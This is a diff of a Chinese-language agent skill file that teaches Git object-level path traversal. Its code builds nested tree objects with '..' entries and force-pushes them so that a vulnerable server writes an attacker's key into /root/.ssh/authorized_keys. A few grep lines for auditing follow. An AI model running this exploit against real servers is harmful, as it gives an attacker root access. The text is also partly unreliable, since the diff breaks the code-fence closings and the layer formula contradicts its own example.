@@ -4,7 +4,6 @@ description: '手工构造 Git 对象含 .. 路径穿越 → 绕过 git 前端�
 disable-model-invocation: true
 metadata: { domain: linux, tier: T3 }
 ---
-> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
 
 # Git 对象手工注入路径穿越
 
@@ -12,12 +11,12 @@ metadata: { domain: linux, tier: T3 }
 
 ## 核心原理
 
-```
+```text
 攻击者可控的 Git repo
     → git ls-tree -r HEAD 输出文件路径
     → 目标程序用 os.path.join(base, filepath) 拼接
     → 如果 filepath 含 .. → 路径穿越 → 写任意文件
-```
+```text
 
 **为什么 Git 前端会拒绝但对象层不拒绝：**
 - `git add` / `git commit` 会校验路径，拒绝 `..` 和 `/` 前缀
@@ -50,8 +49,8 @@ blob_key = write_obj(payload_key.encode(), "blob")
 
 # 2. 创建嵌套 tree（路径穿越链）
 # 目标: 从 /home/git/template-staging/jones/repo/ 逃逸到 /root/.ssh/
-# 需要 5 层 .. 才能到根: ../../../../../../root/.ssh/authorized_keys
-# 但通过嵌套 tree, git ls-tree -r 会输出: ../../../../.. /root/.ssh/authorized_keys
+# 需要 5 层 .. 才能到根: ../../../../../root/.ssh/authorized_keys
+# 但通过嵌套 tree, git ls-tree -r 会输出: ../../../../../root/.ssh/authorized_keys
 
 tree_ssh = write_obj(entry("100644", "authorized_keys", blob_key), "tree")
 tree_root = write_obj(entry("40000", ".ssh", tree_ssh), "tree")
@@ -80,18 +79,18 @@ open(".git/refs/heads/main", "w").write(commit + "\n")
 
 # 5. Push
 # git push http://user:pass@git.target/repo.git main --force
-```
+```text
 
 ## 层数计算公式
 
-```
+```text
 layers_needed = depth_of_target_from_base + 1
 # 例: base=/home/git/template-staging/jones/repo/
 #     target=/root/.ssh/
 #     depth = 5 (home, git, template-staging, jones, repo)
 #     layers_needed = 5
 #     根tree中: 1个 .. entry + 4层嵌套 = 5
-```
+```text
 
 ## 适用条件
 
@@ -121,7 +120,7 @@ git ls-tree -r HEAD | grep -E '\.\.|^/'
 # 审计系统中处理 git tree 的脚本
 grep -r "ls-tree" /opt/ /etc/ /home/ 2>/dev/null
 grep -r "os.path.join" /opt/ /etc/ 2>/dev/null | grep -i "git\|repo"
-```
+```text
 
 ## 教训
 
